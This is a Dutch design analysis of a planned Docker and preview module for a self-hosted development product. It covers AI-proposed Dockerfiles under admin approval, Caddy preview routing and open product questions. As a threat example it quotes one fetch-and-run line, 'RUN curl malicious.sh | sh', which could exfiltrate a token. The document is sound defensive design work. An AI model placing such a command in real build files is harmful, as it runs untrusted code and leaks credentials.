# Stack-agnostisch Docker + AI-bouwt-images + cross-device live tickets

> Module-analyse voor het Workspaces product — gegenereerd 2026-06-14.

---

## Mijn mening

Dit module-idee is het meest technisch ambitieuze van de drie onderdelen die de gebruiker noemt, maar tegelijk ook het meest gefundeerde in het bestaande corpus. De runtime-laag (drie-laags Docker-model, Caddy reverse proxy, `workspaces-net` bridge, egress-proxy) staat al volledig ontworpen in `07b_CONTAINER_RUNTIME.md` en `SELF_HOST_INSTALLER.md`. Dat betekent: de "het werkt gewoon" belofte voor een C#/MySQL-stack is voor **70% al architecturaal gedekt**. Het ontbrekende 30% is het **AI-authoring-pad** (wie ontwerpt die `.workspaces/Dockerfile`?) en de **UX-flow** (van "ik wil een C#-project" naar een draaiende container).

Sterk punt: het is stack-agnostisch by design (`StageProcess`-commando's zijn generiek; een `.NET SDK` L2-image is een kleine `FROM workspaces/base:<semver>` met `dotnet restore` als pre-warm stap). Zwak punt: de "AI bouwt zelf de Dockerfile" belofte botst direct op de hardste locked decision in het corpus: **`Q-CT-DOCKERFILE-TRUST`** — het Dockerfile-bestand is Admin-gated, mag nooit een UI-vrij-tekstveld zijn, en elke wijziging gaat door een menselijke acceptatie. Dat is geen technisch obstakel, het is een bewuste veiligheidsgrens. AI kan een Dockerfile *voorstellen* (via `propose_suggestion`), maar een mens moet die accepteren vóór de bouw start. Dat maakt het verhaal "AI bouwt alles autonomeus" fundamenteel onjuist — maar "AI stelt de stack voor, jij keurt goed en dan werkt het gewoon" is wél haalbaar en eerlijker.

Het cross-device live-ticket gedeelte is het meest onderschat. De Caddy `dev-<ticketId>.<domain>` routing staat al ontworpen. Het echte probleem is niet de reverse proxy configuratie — dat is triviaal in de bestaande opzet — het is het **authenticatie-model voor externe apparaten** (wie mag een preview-URL zien? op welk netwerk? met welke TLS-trust?). Dat is een ontwerp-gap, geen technische onmogelijkheid.

Wat dit onderdeel zou laten schitteren: een **stack-wizard** (niet AI-fully-autonomous, maar een geleide flow met AI-assistent) die de gebruiker door stack-keuzes leidt, een Dockerfile + `ci.yml` stubs genereert als *voorstel*, en de Admin daarna één klik "Accepteer en bouw" geeft. Dat is de correcte realisatie van de belofte.

---

## Past op bestaande design

### Wat al bestaat

| Concept | Doc | Status |
|---|---|---|
| Drie-laags image model (L1 base / L2 per-project / L3 per-ticket) | `07b_CONTAINER_RUNTIME.md §1` | Volledig ontworpen |
| `.workspaces/Dockerfile` als configuratiepunt voor custom stacks | `07b §1.2` | Ontworpen, Admin-gated |
| Pre-warm van afhankelijkheden in L2 (`npm ci`, `dotnet restore`, etc.) | `07b §1.2` | Ontworpen |
| Stack-agnostische `StageProcess`-commando's | `01_ARCHITECTURE.md §7`, `07_ORCHESTRATOR.md §A` | Ontworpen |
| Caddy `dev-<ticketId>.<domain>` routing via admin API + `@id` | `07b §5`, `07_ORCHESTRATOR.md §B` | Volledig ontworpen |
| Wildcard DNS-01 TLS + interne CA voor LAN/air-gapped | `07b §5.4` | Ontworpen |
| `docker compose up` als installer + `bootstrap.sh` eenmalig | `SELF_HOST_INSTALLER.md §0–§5` | Volledig ontworpen |
| AgentRole plugin model (`registerAgentRole`) | `03_AUTOMATION_AND_PLUGINS.md §3` | Ontworpen |
| `propose_suggestion` → menselijke acceptatie vóór uitvoering (B-23) | `02_PROTOCOL_AND_FLOW.md §7` | LOCKED |
| Hardening table (cap-drop ALL, non-root, pids/mem/cpu/disk limieten) | `07b §7` | LOCKED |

### Spanningen met locked decisions

1. **AI-authored Dockerfile vs `Q-CT-DOCKERFILE-TRUST`** — Het Dockerfile MOET Admin-gated zijn (geen Member, geen autonome AI-schrijf-actie). AI kan alleen een `propose_suggestion` uitsturen met een Dockerfile-draft; een Admin accepteert die, dan pas bouwt de orchestrator. Dit is geen bug, het is de juiste veiligheidsgrens: een `.workspaces/Dockerfile` met `RUN curl malicious.sh | sh` kan de projected subscription-token exfiltreren via de container. De locked trust-grens is dus terecht.

2. **AI-bouwt-images vs PTY-billing invariant** — Een "beschrijf je stack, AI bouwt de image" flow waarbij de AI *zelf* de `docker build` uitvoert is niet toegestaan (B-23: Conductor is de enige schrijver). De AI stelt voor; de Conductor bouwt. Dat is de juiste verdeling.

3. **Cross-device preview vs `dev-<ticketId>.<domain>` sub-domeinen** — De routing bestaat, maar de *authenticatie op die URL* is een gap. Caddy route-add/-delete is per container-start/-teardown via admin API. Externe apparaten (telefoon, ander laptop) moeten via hetzelfde authenticatiemodel de preview kunnen bereiken — dat is nog niet ontworpen.

4. **`previewConcurrencyCap` deelt het `CapacityManager` budget** — Preview-containers (voor cross-device inzage) trekken van hetzelfde `MAX_RESIDENT` budget als worker-containers (`07b §8.2`). Meerdere apparaten die tegelijk een preview laden, genereren geen extra containers (de preview-container draait al), maar dit is een nuance die de gebruiker moet begrijpen.

---

## Risico's

- **"Het werkt gewoon" is een belofte die over-sells.** Voor een C#/MySQL-project moet de operator: (1) een Admin zijn die het `.workspaces/Dockerfile` accepteert, (2) een DNS-record aansluiten, (3) een wildcard TLS-cert laten uitrollen. Dat is niet zero-config. De bootstrap-wizard moet dit demystificeren.

- **AI-authored Dockerfiles zijn een supply-chain risico.** Een LLM kan een geldige maar gevaarlijke `FROM`-instructie schrijven (malafide base image, kwaadaardige `RUN`). De Admin-gate is de correcte mitigatie, maar de UX moet duidelijk maken *waarom* die gate er is — anders wordt het een frustratiepunt.

- **Stack-diversiteit bemoeilijkt het L1 base image.** Het huidige L1 is `node:22-bookworm-slim` met Node-toolchain, DB-clients en de Claude CLI. Een C#-project heeft `dotnet` nodig in L2, maar als de gebruiker een L2 *niet* levert (of de wizard genereert een fout), valt de stack terug op L1 zonder dotnet. Er moet een duidelijke foutboodschap zijn.

- **Cross-device access vereist LAN-bereikbaarheid of internet-exposure.** Op een LAN-only setup (interne CA) werkt het alleen als het andere apparaat op hetzelfde netwerk zit. Op een publieke setup werkt wildcard DNS-01 TLS, maar vereist dat de host public-facing is. Tunnels (ngrok, Tailscale) zijn niet ontworpen en introduceeren security-surface.

- **Container registry is geen P1.** De docs zeggen expliciet: "single local daemon v1; registry → P4" (`07b §1.1`). AI-gebouwde L2-images worden lokaal gebouwd en lokaal opgeslagen. Dat werkt voor één host; bij team-gebruik (meerdere hosts of een CI die de image wil pullen) is dit een blocker. De gebruiker moet dit weten als de ambitie multi-host wordt.

- **De authenticatie op preview-URLs is een onontworpen gap.** Iedereen met de `dev-<id>.<domain>` URL kan de preview bereiken als er geen auth is. Dit is voor een "trusted small group, self-hosted" model acceptabel, maar moet een bewuste keuze zijn, niet een vergeten gat.

---

## Extra ideeën

### 1. Stack Wizard — geleid, niet autonoom
Een UI-flow (niet AI-fully-autonomous) waarbij de gebruiker zegt "ik wil een C# + MySQL project" en de wizard:
1. Een lijst van standaard stack-templates toont (C# + MySQL, Go + Postgres, Python + Redis, etc.)
2. De AI een `.workspaces/Dockerfile` + `.workspaces/ci.yml` stub genereert als *voorstel* (via `propose_suggestion`)
3. De Admin één klik "Accepteer en bouw" geeft
4. De orchestrator het L2-image bouwt en de pre-warm uitvoert

Dit past perfect in het bestaande `propose_suggestion` → Conductor-schrijft model.

### 2. Stack image catalog
Een catalogus van pre-gebouwde stack-specifieke L2-images (`.NET 8 + MySQL`, `Go 1.22 + Postgres`, `Python 3.12 + Redis`) die de operator bij install kan pullen. Dit bypassed de AI-authoring helemaal voor standaardstacks en verlaagt het security-risico.

### 3. Preview-URL auth via workspace-sessie
`dev-<ticketId>.<domain>` URLs beveiligen via een redirect naar de Workspaces-loginpagina (als de request geen geldige workspace-sessie heeft). Caddy kan dit doen met een forward-auth middleware die de web-app raadpleegt. Dan werkt cross-device access zonder het preview publiek te maken.

### 4. Stack health check in de wizard
Na het bouwen van de L2-image: automatisch een container starten, een health-check uitvoeren (bijv. `dotnet --version`, `mysql --version`), en het resultaat tonen vóór het eerste ticket wordt aangemaakt. Dit geeft de gebruiker vertrouwen dat "het echt werkt."

### 5. Egress-allow-list templates per stack
Voor een `.NET` + externe NuGet-packages stack is de egress allow-list anders dan voor een Node-project. Een set van pre-gedefinieerde egress-templates per stack (bijv. `nuget.org`, `packages.microsoft.com`) die de wizard meeneemt in het voorstel.

---

## Vragen

### V1: Hoe autonoom mag de AI zijn bij het schrijven van Dockerfiles?

**Samenvatting:** Mag de AI zelfstandig een Dockerfile aanmaken (met menselijke goedkeuring achteraf), of moet de mens altijd eerst het sjabloon kiezen?

**Gedetailleerde samenvatting:** Je wil dat een gebruiker zegt "ik wil een C#-project met MySQL" en dat het systeem dat voor elkaar krijgt. De vraag is: hoe ver gaat de AI daarin zelf? Er zijn twee extremen. Aan de ene kant: de AI schrijft zelf een Dockerfile (de technische instructieset voor de container) en stuurt die ter goedkeuring naar een beheerder. Aan de andere kant: de AI toont je een lijst van kant-en-klare sjablonen ("C# + MySQL", "Go + Postgres", enzovoort) en jij kiest er één — geen AI-schrijfwerk, gewoon kiezen. Het risico van de eerste optie is dat een AI een fout of onveilige Dockerfile kan schrijven die pas ontdekt wordt als iemand ernaar kijkt. Het risico van de tweede optie is dat je gebonden bent aan de sjablonen die er al zijn.

**Opties:**
- **a) AI-gegenereerd voorstel, Admin-goedkeuring verplicht** — AI schrijft een Dockerfile-draft, toont die aan een beheerder, die keurt goed vóór de bouw start. Meeste flexibiliteit, hoogste risico op fouten. *(aanbevolen)*
- **b) Pre-gebouwde sjablonen, keuze-UI** — Een catalogus van goedgekeurde stack-images; gebruiker kiest, geen AI-schrijfwerk. Veiligst, minst flexibel.
- **c) Hybride: sjablonen + AI-aanpassing** — Gebruiker kiest een sjabloon als startpunt, AI past het aan op basis van aanvullende wensen, beheerder keurt het aangepaste resultaat goed.

---

### V2: Wie mag een live preview-URL zien?

**Samenvatting:** Is een preview-URL van een lopend ticket openbaar binnen het team, of moet je ingelogd zijn in Workspaces?

**Gedetailleerde samenvatting:** Elke lopend ticket in het systeem krijgt automatisch een eigen webadres (bijv. `dev-123.jouwdomein.nl`). Dat adres laat de draaiende applicatie zien in de container van dat ticket. De vraag is: wie mag dat adres bereiken? Als het volledig open is (geen login nodig), kan iedereen met het adres de applicatie zien — handig voor snelle feedback van collega's of klanten, maar een risico als het ticket iets gevoeligs bevat. Als je verplicht ingelogd moet zijn in Workspaces, is het veilig maar minder makkelijk te delen.

**Opties:**
- **a) Inlogvereiste via Workspaces-sessie** — Caddy controleert of je een geldige sessie hebt vóór het doorsturen. Veilig, werkt op elk apparaat in het team. *(aanbevolen)*
- **b) Volledig open binnen het netwerk (geen auth)** — Eenvoudigste implementatie; acceptabel als het netwerk al vertrouwd is (intern bedrijfsnetwerk). Geen bescherming als de URL uitlekt.
- **c) Tijdelijk deelbare link met vervaltijd** — Preview-URL is standaard geblokkeerd, maar een teamlid kan een tijdelijk publieke link genereren (bijv. 1 uur geldig). Meeste controle, meeste complexiteit.

---

### V3: LAN-only of internet-facing?

**Samenvatting:** Moet Workspaces alleen werken op een intern netwerk, of wil je het ook bereikbaar maken via het internet?

**Gedetailleerde samenvatting:** De technologie achter live ticket-inzage van andere apparaten (Caddy reverse proxy met automatische SSL-certificaten) werkt op twee manieren: intern (alleen bereikbaar als je op hetzelfde Wi-Fi of bedrijfsnetwerk zit) of extern (bereikbaar vanaf elke locatie via internet). De interne variant is eenvoudiger en veiliger: geen publiek IP-adres nodig, geen poort-forwarding, werkt prima voor een team op één locatie. De externe variant geeft meer flexibiliteit (thuis werken, klanten inzage geven), maar vereist een publiek domein, een DNS-configuratie en zorgvuldige beveiliging. Tunneloplossingen zoals Tailscale of ngrok zijn een tussenweg maar introduceren afhankelijkheden van externe diensten.

**Opties:**
- **a) LAN-only (interne CA, geen publiek domein)** — Werkt direct na installatie op een intern netwerk; geen externe configuratie. Beperkter bereik. *(aanbevolen als startpunt)*
- **b) Internet-facing met publiek domein en DNS-01 wildcard TLS** — Maximale flexibiliteit; vereist domein + DNS-provider API-sleutel. Meer installatiecomplexiteit.
- **c) Tailscale/VPN als tussenweg** — Geen publiek IP nodig, maar wel afhankelijkheid van een externe dienst of eigen VPN-setup.

---

### V4: Wat is de scope van "stack-agnostisch" in v1?

**Samenvatting:** Ondersteun je elk denkbaar tech-stack (inclusief exotische talen), of begin je met een select aantal goed-ondersteunde stacks?

**Gedetailleerde samenvatting:** "Stack-agnostisch" klinkt als "alles werkt", maar in de praktijk betekent het: de container-infrastructuur maakt geen aannames over de taal, maar de *ondersteuning* (sjablonen, documentatie, debugging-hulp van de AI) is per stack anders. Een Node.js-project is direct ondersteund (basisimage is al Node-gebaseerd). Een C#-project heeft een extra instructieset in de container nodig. Een COBOL-project of een obscure embedded-taal misschien wel niet. De vraag is: in v1, welke stacks wil je actief ondersteunen met sjablonen en geteste setups, en welke mogen de gebruiker zelf uitzoeken?

**Opties:**
- **a) Alleen Node.js/TypeScript (de bestaande L1 base)** — Geen extra werk; alle andere stacks zijn "bring your own Dockerfile". Eerlijk over de scope.
- **b) Node + C# + Go + Python als ondersteunde stacks** — Pre-gebouwde L2-images + sjablonen voor deze vier. Dekt de meeste moderne projecten. *(aanbevolen)*
- **c) Volledig open: alles wat in een Docker-container past** — Geen actieve ondersteuning, maar ook geen beperking. Maximale vrijheid, minimale begeleiding.

---

### V5: Hoe ga je om met de container-registry behoefte bij team-gebruik?

**Samenvatting:** Als meerdere mensen op aparte machines werken, moeten AI-gebouwde images gedeeld kunnen worden — hoe los je dat op?

**Gedetailleerde samenvatting:** In de huidige opzet worden container-images (de "blauwdrukken" voor je ontwikkelomgeving) lokaal gebouwd en bewaard op de server waar Workspaces op draait. Dat werkt prima als iedereen via dezelfde server werkt. Maar als jij een C#-image hebt laten bouwen en je collega wil datzelfde project openen op een andere server, moet die image opnieuw gebouwd worden — of je hebt een gedeeld "magazijn" voor images nodig (een container registry). In v1 is zo'n magazijn expliciet uitgesteld (het staat als "P4" in de docs, wat betekent: ver in de toekomst). De vraag is of jij dat al in v1 wil, of dat één server als startpunt voldoende is.

**Opties:**
- **a) Lokale build, één server, geen registry in v1** — Eenvoudigste aanpak; images worden per project lokaal opgeslagen. Werkt niet voor multi-host setups. *(aanbevolen als v1 scope)*
- **b) Optioneel externe registry (Docker Hub, GHCR, eigen Gitea-registry)** — Configureerbaar via `.env`; teams die het nodig hebben kunnen het aanzetten. Meer werk, maar toekomstbestendig.
- **c) Built-in private registry als extra compose-service** — Een registry-container in de compose-stack. Altijd beschikbaar, geen extern account nodig, maar extra resource-gebruik en beheer.

---

### V6: Hoe uitgebreid moet de "het werkt gewoon" bootstrap-wizard zijn?

**Samenvatting:** Hoeveel van de DNS/TLS/stack-configuratie mag de wizard automatisch doen versus hoeveel mag van de beheerder worden verwacht?

**Gedetailleerde samenvatting:** "Het werkt gewoon" is de belofte, maar in de praktijk heeft een zelf-gehoste omgeving altijd een paar handmatige stappen: een domeinnaam instellen, een SSL-certificaat aanvragen, een Claude-account koppelen. De bestaande `bootstrap.sh` doet al een deel hiervan interactief. De vraag is hoe ver je wil gaan: een minimale wizard die de technische beheerder door de stappen leidt (ervanuit gaande dat die weet wat DNS is), of een maximaal begeleide flow met validatie, duidelijke foutmeldingen en zelfs automatische DNS-verificatie. Hoe "zelf-hoster-vriendelijk" moet dit zijn voor iemand die geen DevOps-achtergrond heeft?

**Opties:**
- **a) Technisch-gericht: stap-voor-stap CLI met duidelijke instructies** — Verwacht dat de beheerder weet wat DNS en SSL zijn. Snel te implementeren. *(aanbevolen voor v1)*
- **b) Begeleide UI-wizard met validatie** — Installatie via een browser-interface met realtime controle ("DNS werkt ✓", "certificaat aangevraagd ✓"). Meer werk, betere ervaring voor niet-technische beheerders.
- **c) Auto-detectie en auto-configuratie** — Wizard detecteert de netwerkomgeving (LAN vs internet, OS, bestaand domein) en configureert zo veel mogelijk automatisch. Hoogste complexiteit, beste "het werkt gewoon" ervaring.

---

### V7: Hoe wil je dat AI-gegenereerde Dockerfiles worden gevalideerd vóór acceptatie?

**Samenvatting:** Moet er een automatische veiligheidscheck zijn op AI-voorgestelde Dockerfiles, of vertrouw je volledig op de menselijke Admin-review?

**Gedetailleerde samenvatting:** Als de AI een Dockerfile schrijft en die ter goedkeuring stuurt, kan een beheerder die inspecteren. Maar de meeste beheerders zijn geen Docker-veiligheidsexperts. Een AI kan onbedoeld een instructie schrijven die een kwetsbare versie van software installeert, een onnodige poort openzet, of een onbekende externe bron aanroept. De vraag is of je een automatische controletool wil die de voorgestelde Dockerfile vóór de review al scant op bekende problemen (bijv. "dit image heeft een bekende kwetsbaarheid", "dit commando downloadt iets van het internet"). Zo'n tool vergroot de veiligheid maar voegt complexiteit toe.

**Opties:**
- **a) Alleen menselijke review, geen automatische scan** — Eenvoudig; de Admin-gate is al de bescherming. Afhankelijk van de kennis van de reviewer. *(acceptabel voor v1 met trusted small group)*
- **b) Automatische lint/scan vóór de review-stap** — Een tool als `hadolint` of `trivy` scant de voorgestelde Dockerfile en toont waarschuwingen in de review-UI. Beheerder ziet: "3 waarschuwingen gevonden, klik om te bekijken." Meer werk, betere vangnet.
- **c) AI-gegenereerde Dockerfiles alleen uit pre-goedgekeurde base-images** — De AI mag alleen `FROM workspaces/base:<semver>` gebruiken als startpunt (wat al een locked decision is), en de set van toegestane `RUN`-commando's is beperkt via een allowlist. Veiligst, meest beperkend.
